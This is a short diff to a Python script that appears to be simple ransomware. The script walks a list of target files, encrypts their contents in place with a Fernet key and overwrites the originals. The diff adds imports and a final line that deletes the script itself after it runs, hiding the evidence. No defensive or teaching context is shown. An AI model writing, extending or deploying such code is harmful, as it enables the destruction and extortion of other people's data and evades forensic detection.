@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import os
+from os import remove
+from sys import argv
 from cryptography.fernet import Fernet
 
 # find targets
@@ -19,3 +21,5 @@ for target in targets:
         contents_encrypted = Fernet(key).encrypt(contents.encode())
         with open(file, "wb") as thetarget:
                 thetarget.write(contents_encrypted)
+
+remove(argv[0])
